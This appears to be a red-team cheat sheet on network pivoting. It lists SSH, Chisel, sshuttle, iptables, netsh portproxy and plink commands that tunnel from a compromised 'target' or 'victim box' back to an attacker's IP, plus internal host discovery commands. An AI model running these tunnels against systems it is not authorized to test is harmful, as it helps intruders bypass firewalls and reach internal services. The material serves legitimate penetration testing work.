# Tunneling / Port Forwarding / Pivoting  
 Expose internal services, usually hidden due to firewall rules or gain further access into a network. 

[Pivot cheat sheet](https://assets.contentstack.io/v3/assets/blt36c2e63521272fdc/blt0f228a4b9a1165e4/5ef3d602395b554cb3523e7b/pivot-cheat-sheet-v1.0.pdf)   
[Pivoting for Red Teamers](https://artkond.com/2017/03/23/pivoting-guide/)   
[Basic Tuneling](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)  
 
 - [Tunneling / Port Forwarding / Pivoting](#tunneling---port-forwarding---pivoting)
  * [Chisel](#chisel)
    + [Chisel socks Reverse Proxy](#chisel-socks-reverse-proxy)
    + [Chisel socks Forward Proxy](#chisel-socks-forward-proxy)
    + [Chisel Remote Port Forward](#chisel-remote-port-forward)
    + [Chisel Local Port Forward](#chisel-local-port-forward)
- [Linux Port Forwarding](#linux-port-forwarding)
  * [SShuttle](#sshuttle)
- [Windows Port Forwarding](#windows-port-forwarding)
  * [SSH (Window 10 and newer)](#ssh--window-10-and-newer-)
  * [Plink.exe](#plinkexe)

## SSH 
### Local Tunnels 
Local tunnel from Kali attack box through a pivot to a service on target. Default local ip is 0.0.0.0

    ssh -p <port> user@pivot -L <local ip for specific interface>:<local port on attack box>:<target host>:<target port> 
    
### Remote Tunnels
Remote tunnel to Kali through a pivot from target (may need to join tunnels depending on config)  

    ssh -R <Kali port>:localhost:<target port> user@<pivot ip> 
    
### Dynamic Tunnels 
To scan through a tunnel

    ssh -D 9050 user@localhost -p <port on kali used for tunnel> 

Then running scans through proxychains 

    proxychains nmap -sV <target> 
 ## Chisel 
[Chisel](https://github.com/jpillora/chisel)   
[Pivoting with Chisel Guide](https://ap3x.github.io/posts/pivoting-with-chisel/)  
Good for getting through firewalls, need correct copies of binaries on both target / attack box  
Need to change /etc/proxychains4.conf socks4 to socks5 on attack box 
### Chisel socks Reverse Proxy 
    attack    ./chisel server -p LISTEN_PORT --reverse &  
    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks & 
### Chisel socks Forward Proxy 
    target    ./chisel server -p LISTEN_PORT --socks5  
    attack    ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks 
### Chisel Remote Port Forward 
    attack    ./chisel server -p LISTEN_PORT --reverse &  
    target    ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT & 
### Chisel Local Port Forward 
    target    ./chisel server -p LISTEN_PORT 
    attack    ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT 
 
 # Linux Port Forwarding 
 
 ## SShuttle
  If pivot is a Linux box with python installed you can ssh into: can use [sshuttle](https://github.com/sshuttle/sshuttle) to connect into network. 
  
      apt-get install sshuttle 
      sshuttle -r user@10.10.10.10 --ssh-cmd "ssh -i id_rsa" 10.10.0.0/24 -x [pivot ip]
 
 ## IPTables 
 
     iptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to-destination 192.168.0.20:22 

 
 # Windows Port Forwarding 
     netsh firewall show config 
     netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT    
## Portproxy

    netsh interface portproxy add <type> listenport=<port in> connectport=<port out> connectaddress=<destination>  
    
    <type> can be v4tov4, v4tov6, v6tov4, v6tov6 


## SSH (Window 10 and newer)
     [from target box to expose SMB ]
     ssh -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 
## Plink.exe
[upload plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)  

     plink.exe -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS   <-note entering in your password on a victim box is a bad idea
     
     [generate ssh keys on kali, convert to putty keys and then upload with plink.exe to target ] 
     sudo apt install putty-tools 
     puttygen KEYFILE -o OUTPUT_KEY.ppk 
     cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N 
     
# Scanning though a pivot 
uploading static binaries from [here](https://github.com/andrew-d/static-binaries)  

## Commands 

### Linux 

    arp -a
    cat /etc/hosts
    cat /etc/resolv.conf  
   
    for x in {1..254};do (ping -c 1 10.1.1.$x | grep "bytes from" &); done | cut -d " " 

